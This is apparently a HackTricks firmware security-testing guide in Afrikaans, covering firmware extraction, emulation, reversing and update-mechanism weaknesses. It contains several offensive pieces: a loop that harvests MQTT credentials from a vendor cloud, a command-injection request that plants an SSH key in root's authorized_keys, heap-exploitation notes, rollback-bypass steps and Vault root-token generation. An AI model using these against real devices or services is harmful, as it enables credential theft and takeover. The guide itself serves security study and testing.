# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang het tot belangrike instruksies vanaf die oomblik dat dit aangeskakel word, wat lei tot die laai van die bedryfstelsel. Die ondersoek en moontlike wysiging van firmware is 'n kritieke stap om sekuriteitskwesbaarhede te identifiseer.

## **Insameling van inligting**

**Die insameling van inligting** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit loop
- Besonderhede oor die bootloader
- Hardeware-uitleg en datasheets
- Kodebasis-metrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifiserings
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, net soos die ontleding van enige beskikbare open-source-sagtewarekomponente deur middel van handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese analise wat gebruik kan word om potensiële probleme te vind.

## **Verkryging van die firmware**

Firmware kan op verskeie maniere verkry word, elk met sy eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit te **bou** volgens verskafte instruksies
- Deur dit vanaf amptelike ondersteuningswerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om gehuisvesde firmware-lêers te vind
- Deur direk toegang tot **wolkberging** te verkry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** deur verbindings soos **UART**, **JTAG**, of **PICit**
- Deur binne toestेलkommunikasie vir opdateringsversoeke te **snuffel**
- Deur **hardcoded update endpoints** te identifiseer en te gebruik
- Deur dit vanaf die bootloader of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en te lees** wanneer alles anders misluk, met toepaslike hardeware-nutsmiddels

### Slegs UART-logboeke: dwing 'n root shell af via U-Boot env in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds 'n init shell afdwing deur die U-Boot-omgewingsblob vanlyn te **wysig**:

1. Dump die SPI-flash met 'n SOIC-8-clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Lokaliseer die U-Boot-env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot-env CRC32** vir die blob opnuut.
3. Reflash slegs die env-partisie en herlaai; 'n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader-shell gedeaktiveer is, maar die env-partisie deur eksterne flash-toegang skryfbaar is.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende nutsmiddels wat jy daarvoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie tools vind nie, kontroleer die **entropy** van die image met `binwalk -E <bin>`. As die entropy laag is, is dit waarskynlik nie encrypted nie. As die entropy hoog is, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie tools gebruik om **files wat binne die firmware ingebed is** te extract:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die file te inspekteer.

### Kry die lêerstelsel

Met die vorige tools, soos `binwalk -ev <bin>`, behoort jy die **lêerstelsel te kon extract** het.\
Binwalk extract dit gewoonlik binne ’n **folder wat na die lêerstelseltipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelsel-ekstraksie

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy signatures hê nie**. In hierdie gevalle, gebruik binwalk om die **offset van die lêerstelsel te vind en die compressed lêerstelsel** uit die binary te **carve**, en **extract** die lêerstelsel dan handmatig volgens sy tipe deur die stappe hieronder te gebruik.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs-lêerstelsel te carve.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (in die voorbeeld hierbo gebruik)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware ontleed

Sodra die firmware verkry is, is dit noodsaaklik om dit te dissekteer om die struktuur en potensiële kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om waardevolle data uit die firmwarebeeld te ontleed en te onttrek.

### Aanvanklike analise-nutsgoed

'n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna as `<bin>` verwys word). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te bepaal, word die **entropy** met `binwalk -E <bin>` nagegaan. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy moontlike enkripsie of kompressie aandui.

Vir die onttrekking van **embedded files** word tools en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die Lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (byvoorbeeld squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die lêerstelsel se offset te bepaal, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende opdragte gebruik om die inhoud handmatig uit te pak.

### Lêerstelselontleding

Wanneer die lêerstelsel uitgepak is, begin die soektog na sekuriteitsfoute. Aandag word gegee aan onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-endpunte, opdateringsbedienerfunksionaliteit, ongekompileerde kode, opstartskripte en gekompileerde binaries vir offline-ontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestel-webbedieners en binaries

Verskeie tools help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir die soektog na sensitiewe inligting
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gekompileerde binaries

Beide bronkode en gekompileerde binaries wat in die lêerstelsel gevind word, moet noukeurig vir kwesbaarhede ondersoek word. Tools soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Insameling van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van ’n cloud-endpunt af wat soos volg lyk:

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word deur ’n hardgekodeerde geheim te gebruik, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY te wete kom, in staat om die URL te rekonstrueer en die cloud-konfigurasie af te laai, wat dikwels gewone teks-MQTT-geloofsbriewe en topic-voorvoegsels openbaar.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-opstartlogs

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem logs vas:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Soek na lyne wat die cloud config URL-patroon en broker-adres druk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme vanaf firmware

- Laai binaries in Ghidra/radare2 en soek die config path ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en skakel die digest om na hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Versamel cloud-konfigurasie en MQTT-geloofsbriewe

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics in te teken en soek na sensitiewe gebeurtenisse:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerateer voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme sluit verkoper-OUI/produk/tipe-grepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief deurloop, tokens aflei en konfigurasies programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Verkry altyd uitdruklike magtiging voordat jy mass enumeration probeer.
- Verkies emulasie of statiese analise om secrets te herwin sonder om die teikenhardeware te wysig, waar moontlik.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik, hetsy van ’n toestel se werking of van ’n individuele program. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtual machine, kan verdere toetsing vergemaklik.

### Emulering van Individuele Binaries

Vir die ondersoek van enkele programme is dit noodsaaklik om die program se endianness en CPU-argitektuur te identifiseer.

#### Voorbeeld met MIPS Architecture

Om ’n MIPS architecture-binary te emuleer, kan die volgende command gebruik word:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasiehulpmiddels te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sal `qemu-mipsel` die keuse wees.

#### ARM-argitektuuremulering

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volstelsel-emulasie

Tools soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander, fasiliteer volledige firmware-emulasie, outomatiseer die proses en help met dinamiese ontleding.

## Dinamiese ontleding in die praktyk

Op hierdie stadium word óf ’n werklike óf ’n geëmuleerde toest omgewing vir ontleding gebruik. Dit is noodsaaklik om shell-toegang tot die OS en lêerstelsel te behou. Emulasie boots moontlik nie hardeware-interaksies perfek na nie, wat soms vereis dat die emulasie herbegin word. Ontleding moet die lêerstelsel weer ondersoek, blootgestelde webblaaie en netwerkdienste exploit, en bootloader-kwesbaarhede verken. Firmware-integriteitstoetse is krities om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime-ontledingstegnieke

Runtime-ontleding behels interaksie met ’n proses of binary in sy bedryfsomgewing, met tools soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir embedded targets sonder ’n volledige debugger, **kopieer ’n staties-gekoppelde `gdbserver`** na die toestel en heg dit op afstand aan:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor-boodskapmapping

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige workflow is om die pad te karteer:

1. **RF-frame** in die lug
2. **controller-side parser** op die radio MCU
3. **serial/UART text or TLV protocol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **application dispatcher** in die hoofdemon
5. **protocol-specific handler / state machine**

Hierdie argitektuur skep twee reversing-teikens in plaas van een. As die controller binêre radioframes na ’n tekstuele protocol soos `Group,Command,arg1,arg2,...` omskakel, herwin:

- Die **message groups** en dispatch-tabelle
- Watter messages van die **network** af kan kom versus van die controller self
- Die presiese **manufacturer-specific discriminator fields** (byvoorbeeld Zigbee `manufacturer_code` en custom `cluster_command`)
- Watter handlers slegs tydens **commissioning**, discovery of firmware/model-downloadfases bereikbaar is

Vir Zigbee, capture pairing traffic en kyk of die teiken steeds die default **Link Key** `ZigBeeAlliance09` gebruik. Indien wel, kan sniffing van commissioning traffic die **Network Key** blootlê. Zigbee 3.0 install codes verminder hierdie blootstelling, dus moet jy aanteken of die getoetste device dit werklik afdwing.

### Manufacturer-specific protocol handlers en FSM-gated reachability

Vendor-specific Zigbee/ZCL-commands is dikwels ’n beter teiken as gestandaardiseerde clusters omdat hulle **custom parsing code** en interne **FSMs** voed met minder battle-tested validation.

Praktiese workflow:

- Reverse die command dispatcher totdat jy die **vendor-only handler** vind.
- Herwin die **FSM state**, **event**, **check**, **action** en **next-state**-tabelle.
- Identifiseer **transitional states** wat outomaties voortgaan, asook retry/error-vertakkings wat uiteindelik attacker-controlled state reset of vrylaat.
- Bevestig watter legitimate protocol exchanges nodig is om die daemon in die vulnerable state te plaas, eerder as om aan te neem dat die buggy handler altyd bereikbaar is.

Vir timing-sensitive protocols kan packet replay vanaf ’n Python-framework te stadig wees. ’n Meer betroubare benadering is om ’n legitimate device op real hardware (byvoorbeeld ’n **nRF52840**) te emuleer met ’n vendor-grade stack, sodat jy die korrekte **endpoints**, **attributes** en commissioning timing kan blootstel.

### Fragmented-download bug class in embedded daemons

’n Herhalende firmware-bug class kom voor in **fragmented blob/model/configuration downloads**:

1. Die **first fragment** (`offset == 0`) stoor `ctx->total_size` en allokeer `malloc(total_size)`.
2. Latere fragments valideer slegs die attacker-controlled **packet-local** fields soos `packet_total_size >= offset + chunk_len`.
3. Die copy gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **original allocated size** te toets.

Dit stel ’n attacker in staat om:

- ’n Eerste geldige fragment met ’n **small** declared total size te stuur om ’n klein heap-allocation af te dwing.
- ’n Latere fragment met die **expected offset**, maar ’n groter `chunk_len`, te stuur.
- ’n Forged packet-local size te stuur wat aan die vars checks voldoen, terwyl dit steeds die oorspronklik geallokeerde buffer overflow.

Wanneer die vulnerable path agter commissioning logic sit, moet exploitation genoeg **device emulation** insluit om die teiken in die verwagte model-download- of blob-download-state te dryf voordat die malformed fragments gestuur word.

### Protocol-driven `free()` triggers

In embedded daemons is die maklikste manier om heap metadata exploitation te trigger dikwels nie om “vir cleanup te wag” nie, maar om die protocol se eie error handling af te dwing:

- Stuur malformed follow-up fragments om die FSM na **retry**- of **error**-states te stoot.
- Oorskry die retry threshold sodat die daemon **reset context** en die corrupted buffer vrylaat.
- Gebruik hierdie voorspelbare `free()` om allocator-side primitives te trigger voordat die process om onverwante redes crash.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-like** allocators in embedded Linux, waar die korrupsie van chunk metadata unlink/unbin-logika in ’n write primitive kan omskakel. ’n Stabiele patroon is om ’n **size field** te korrupteer om allocator traversal na **fake chunks** te herlei wat binne die overflowed buffer gestage is, eerder as om onmiddellik werklike bin pointers te oorskryf en die process te laat crash.

## Binary Exploitation en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde vulnerabilities vereis ’n diep begrip van die teikenargitektuur en programming in lower-level languages. Binary runtime protections in embedded systems is skaars, maar wanneer dit teenwoordig is, kan techniques soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot allocation kan `__malloc_consolidate()` trigger, dus moet enige fake chunk checks oorleef (sane size, `fd = 0`, en omliggende chunks wat as "in use" gesien word).
- **Non-PIE binaries under ASLR:** indien ASLR enabled is, maar die hoofbinary **non-PIE** is, is in-binary `.data/.bss`-addresses stable. Jy kan ’n region teiken wat reeds soos ’n geldige heap chunk header lyk om ’n fastbin allocation op ’n **function pointer table** te laat land.
- **Parser-stopping NUL:** wanneer JSON geparse word, kan ’n `\x00` in die payload parsing stop terwyl trailing attacker-controlled bytes vir ’n stack pivot/ROP-chain behoue bly.
- **Shellcode via `/proc/self/mem`:** ’n ROP-chain wat `open("/proc/self/mem")`, `lseek()` en `write()` call, kan executable shellcode in ’n bekende mapping plaas en daarheen jump.

## Prepared Operating Systems for Firmware Analysis

Operating systems soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) verskaf pre-configured environments vir firmware security testing, toegerus met die nodige tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met security assessment en penetration testing van Internet of Things (IoT)-devices. Dit spaar jou baie tyd deur ’n pre-configured environment met al die nodige tools wat gelaai is, te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selfs wanneer ’n vendor cryptographic signature checks vir firmware images implementeer, word **version rollback (downgrade) protection** dikwels weggelaat. Wanneer die boot- of recovery-loader slegs die signature met ’n embedded public key verifieer, maar nie die *version* (of ’n monotonic counter) van die image wat geflash word vergelyk nie, kan ’n attacker wettiglik ’n **ouer, vulnerable firmware wat steeds ’n geldige signature dra** installeer en sodoende gepatchte vulnerabilities weer bekendstel.

Tipiese attack workflow:

1. **Obtain an older signed image**
* Kry dit vanaf die vendor se public download portal, CDN of support site.
* Extract dit uit companion mobile/desktop applications (bv. binne ’n Android APK onder `assets/firmware/`).
* Retrieve dit uit third-party repositories soos VirusTotal, Internet archives, forums, ens.
2. **Upload or serve the image to the device** via enige exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie consumer IoT-devices stel *unauthenticated* HTTP(S)-endpoints bloot wat Base64-encoded firmware blobs aanvaar, dit server-side decode en recovery/upgrade trigger.
3. Na die downgrade, exploit ’n vulnerability wat in die nuwer release gepatch is (byvoorbeeld ’n command-injection filter wat later bygevoeg is).
4. Flash opsioneel die latest image terug of disable updates om detection te vermy sodra persistence verkry is.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk in ’n shell-opdrag aaneengeskakel sonder sanitering, wat inspuiting van arbitrêre opdragte moontlik maak (hier – om root-toegang gebaseer op SSH-sleutels te aktiveer). Latere firmware-weergawes het ’n basiese karakterfilter ingestel, maar die afwesigheid van downgrade-beskerming maak die regstelling nutteloos.

### Onttrekking van Firmware Uit Mobiele Toepassings

Baie verskaffers bundel volledige firmware-beelde binne hul metgesel-mobiele toepassings sodat die toepassing die toestel oor Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Tools soos `apktool`, `ghidra`, of selfs gewone `unzip` laat jou toe om getekende beelde te onttrek sonder om aan die fisiese hardeware te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Anti-rollback-bypass wat slegs updater vereis in A/B-slotontwerpe

Sommige vendors implementeer wel ’n anti-downgrade **ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery command, of ’n userspace OTA-agent). As die **bootloader** later slegs die image se signature/CRC nagaan en die partition table of slot-metadata vertrou, kan rollback-beskerming steeds omseil word.

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywing en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in persistente storage gestoor word en verwerp ouer signed images.
- Die bootloader **parse** nie daardie ratchet nie en verifieer slegs die header, CRC en signature voordat dit die gekose slot boot.
- Slotaktivering word afsonderlik in ’n partition table of per-slot generation counter gestoor en is **nie kriptografies gebind** aan die presiese firmware digest wat gevalideer is nie.

Dit skep ’n **validate-one-image / boot-another-image**-primitive in dual-slot-stelsels. As die aanvaller die updater kan laat merk dat slot B die volgende boot-teiken is deur ’n huidige signed image te gebruik, en slot B later voor reboot kan oorskryf, kan die bootloader steeds die downgraded image boot omdat dit slegs die reeds-gecommitte slot-metadata vertrou.

Algemene abuse-patroon:

1. Upload ’n **huidige signed** firmware na die passiewe slot en voer die normale validation/switch-roetine uit sodat die layout daardie slot as volgende aktief merk.
2. **Moenie nog reboot nie**. Gaan die slot-preparation/erase-roetine in dieselfde sessie weer binne.
3. Abuse verouderde boot-state of verouderde slot-selection-logika sodat die updater die **dieselfde fisiese slot** wat pas bevorder is, uitvee.
4. Skryf ’n **ouer maar steeds signed** firmware na daardie slot.
5. Slaan die validation-roetine wat die ratchet afdwing oor en reboot direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs signature/integrity, en boot die ou image.

Dinge waarna gekyk moet word wanneer A/B-update-implementerings gereverse word:

- Slotkeuse wat afgelei word van **boot-time flags** wat nie ná ’n suksesvolle switch verfris word nie.
- ’n `prepare_passive_slot()`-styl roetine wat ’n slot op grond van verouderde state uitvee in plaas van die **huidige gecommitte layout**.
- ’n `part_write_layout()`-styl funksie wat slegs ’n **generation counter** / active flag verhoog en nie die gevalideerde image hash stoor nie.
- Ratchet-checks wat in userspace- of updater-code geïmplementeer is, maar **nie** in ROM / bootloader / secure boot-stadia nie.
- Erase- of recovery-roetines wat die slot as bootable gemerk laat selfs nadat die inhoud verwyder en herskryf is.

### Kontrolelys vir die assessering van Update-logika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die device **version numbers** of ’n **monotone anti-rollback counter** voordat dit flash?
* Word die image binne ’n secure boot chain geverifieer (bv. signatures wat deur ROM-code nagegaan word)?
* **Dwing die bootloader dieselfde ratchet af** as die updater, in plaas daarvan om slegs signature/CRC na te gaan?
* Is slotaktivering se metadata **gebind aan die gevalideerde firmware digest/version**, of kan ’n slot ná promotion gewysig word?
* Word die device ná ’n suksesvolle slot-switch gedwing om te reboot, of is latere update/erase-roetines steeds in dieselfde sessie bereikbaar?
* Voer userland-code addisionele sanity checks uit (bv. toegelate partition map, model number)?
* Hergebruik *partial* of *backup* update-flows dieselfde validation-logika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Kwesbare firmware om mee te oefen

Om te oefen met die ontdekking van vulnerabilities in firmware, gebruik die volgende kwesbare firmware-projekte as ’n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-decryption keys uit ingebedde KMS/Vault-state

Wanneer ’n update image klein plaintext-metadata met ’n groot hoë-entropieblob meng, doen eers container-triage voordat enigiets brute-forced word:

- Dump headers, offsets en lyngrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d`, en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 bytes is die salt en die oorblywende bytes is ciphertext.
- ’n Base64-veld wat na presies `256` bytes decode, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware password/session key wrap.
- Detached PGP-materiaal in dieselfde file beskerm dikwels slegs authenticity; moenie aanvaar dat dit die confidentiality-meganisme is nie.

As statiese key hunting (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse eerder die **operasionele decrypt-path** as om slegs vir private keys te soek:

- Decompile die updater- / management-binary en trace wie die encrypted blob lees, watter helper/API dit unwrap, en die logiese key name wat dit versoek.
- Soek die extracted root filesystem vir KMS-state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) plus unit files en init scripts.
- Behandel plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, of plaaslike KMS auto-unseal scripts as ekwivalent aan private-key-materiaal.

As die appliance die oorspronklike Vault-binary en storage backend insluit, is dit gewoonlik makliker om daardie environment te replay as om Vault-internals te herimplementeer:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Met root op die gekloonde KMS:

